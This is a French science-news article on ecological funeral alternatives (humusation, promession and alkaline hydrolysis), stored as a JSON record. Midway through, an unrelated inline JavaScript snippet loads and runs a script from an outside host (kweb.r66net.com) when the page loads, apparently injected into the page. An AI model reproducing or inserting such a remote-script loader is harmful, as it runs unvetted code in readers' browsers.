{"title": "Funérailles écologiques : les alternatives à l'inhumation et la crémation", "newspaper": "Futura Sciences", "author": "Par la rédaction de Futura", "date_publi": "31/10/2017", "content": "Si, en France, seules l'inhumation et la crémation sont possibles en matière de funérailles, d'autres pratiques voient le jour dans le monde, mais restent plutôt marginales. Quelles sont ces alternatives jugées plus écologiques par leurs partisans ? Ce qu'il faut retenir Différentes alternatives à la crémation et l'inhumation se développent dans le monde. L’humusation consiste à placer le corps entre des végétaux. La liquéfaction, ou aquamation, est autorisée dans certains États américains.  Il existe aussi la promession, s'appuyant sur l'utilisation d'azote liquide et sur la lyophilisation. Humus , azote  liquide  et lyophilisation, dissolution... Certains modes de funérailles encore confidentiels seraient, assurent leurs partisans, plus écologiques que l' inhumation  et la crémation classiques, les seules méthodes autorisées en France. « C'est plutôt à un stade expérimental pour le moment dans différents pays » , commente Jo Le Lamer, vice-président de la Fédération française de crémation.  «  A priori  on n'y est pas hostiles, au contraire.  [...]  On demande à voir ». “ C'est plutôt à un stade expérimental pour le moment dans différents pays. Si elle avait eu cette possibilité, Laetitia Royant, coauteur du livre  Funérailles écologiques - Pour des obsèques respectueuses de l'homme et de la planète , aurait  « sans doute »  choisi l'humusation quand elle a planifié ses funérailles.  « C'est mettre le corps en  compost  entre des couches de  bois , de feuilles » , explique-t-elle, un processus  « logique »  pour celle qui  « aime faire du jardin » . En Belgique, où ils militent pour son autorisation, les partisans de l'humusation décrivent sur leur  site Internet  une transformation  « hors sol »  du corps déposé dans un  compost  sur un terrain  « sécurisé » . Après une année, les proches du défunt peuvent récupérer ce « super-compost » pour fertiliser une pousse d'arbre. Des projets similaires existent notamment aux États-Unis. L’humus peut aider à faire pousser un arbre. © Tomasz Zajda, Fotolia                               La promession : azote liquide et lyophilisation La promession, quant à elle, consiste à exposer le  corps  déjà congelé du défunt à de l' azote liquide  (-196 °C).  « Cela rend le corps cassant et ensuite nous utilisons des vibrations qui le désagrègent en petits morceaux » , ensuite lyophilisés, explique à l'AFP sa créatrice, la Suédoise Susanne Wiigh-Mäsak, qui décrit un système qui  « imite la nature »  avec l'aide d'une  « technologie respectueuse » . Les restes peuvent ensuite être enterrés ou faire l'objet d'une crémation.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Cette méthode n'est encore utilisée nulle part même si certaines législations le permettraient (Australie, Afrique du Sud, Corée du Sud, Écosse, certaines parties de l'Allemagne), assure Susanne Wiigh-Mäsak. La liquéfaction, ou hydrolyse alcaline Enfin, dernière technique qui fait parler d'elle : l'hydrolyse alcaline, ou liquéfaction. Décrite parfois comme une crémation par l'eau plutôt que par le feu, l'hydrolyse alcaline (« résomation » ou « aquamation » selon les entreprises qui les développent) consiste à immerger le corps dans une solution alcaline qui le dégrade. Le saviez-vous ? En octobre 2017, la Californie a voté un texte autorisant la liquéfaction (ou aquamation), qui est déjà légale dans 14 autres États américains.  À l'issue du processus,  « de la cendre blanche pure est rendue aux proches » , explique à l'AFP Sandy Sullivan, fondateur de l'entreprise  Resomation  basée en Grande-Bretagne, qui assure que sa méthode dépense cinq fois moins d'énergie qu'une crémation. Resomation opère dans certaines régions des États-Unis et du Canada, et prochainement en Grande-Bretagne, selon Sandy Sullivan. Avec Amélie Bottollier-Depois - AFP ", "theme": "sante"}